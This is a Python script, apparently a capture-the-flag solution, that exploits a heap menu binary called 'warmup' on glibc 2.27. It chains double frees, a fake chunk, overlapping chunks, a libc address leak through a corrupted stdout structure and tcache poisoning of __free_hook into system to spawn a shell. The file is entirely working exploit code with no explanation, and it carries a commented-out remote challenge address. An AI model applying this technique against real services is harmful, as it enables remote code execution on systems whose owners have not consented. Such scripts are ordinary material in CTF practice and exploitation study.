from ptrlib import *
from time import sleep

def add(data):
    if b'invalid' in sock.recvuntil("\n>>"):
        return False
    sock.sendline("1")
    sock.sendafter("content>>", data)
    return True

def delete(index):
    sock.sendlineafter("\n>>", "2")
    sock.sendlineafter(":", str(index))
    return

def modify(index, data):
    sock.sendlineafter("\n>>", "3")
    sock.sendlineafter(":", str(index))
    sock.sendafter("content>>", data)
    return

libc = ELF("./libc-2.27.so")

while True:
    sock = Process("./warmup")
    #sock = Socket("47.52.90.3", 9999)
    #sleep(3)

    add("0")     # 0 @0x50
    add("1")     # 1 @0xa0

    # create fake chunk
    logger.info("[+] Creating fake chunk")
    delete(0)
    delete(0)
    delete(0)
    add("\xa0\x77") # 0 (1/16 possible)
    payload = p64(0) + p64(0x21) + p64(0) * 3 + p64(0x21)
    add(p64(0))     # 2
    add(payload)    # 3

    # overlap chunk
    logger.info("[+] Overlapping chunk")
    try:
        delete(0)
    except:
        continue
    delete(2)
    delete(2)
    add("\xa0")  # 0
    payload = p64(0) + p64(0x501)
    add(p64(0))  # 2
    add(payload) # 4
    delete(1) # put libc address

    # libc leak
    logger.info("[+] Leaking libc...")
    modify(4, p64(0) + p64(0x51) + b'\x60\x07\xdd')
    #modify(4, p64(0) + p64(0x51) + b'\x60\xd7')
    delete(0)
    delete(2)
    delete(2)
    delete(2)
    add("\xb0") # 0
    add(p64(0)) # 1
    add(p64(0)) # 2
    logger.info("[+] Go!")
    add(p64(0xfbad1800) + p64(0) * 3 + b'\x88') # 4
    libc_base = u64(sock.recv(8)) - libc.symbol("_IO_2_1_stdout_") - 131
    logger.info("libc base = " + hex(libc_base))

    # tcache poisoning
    logger.info("[+] Getting the shell...")
    delete(0)
    delete(1)
    delete(1)
    add(p64(libc_base + libc.symbol("__free_hook"))) # 0
    add("/bin/sh\x00") # 1
    add(p64(libc_base + libc.symbol("system")))

    delete(1)

    sock.interactive()
    exit()
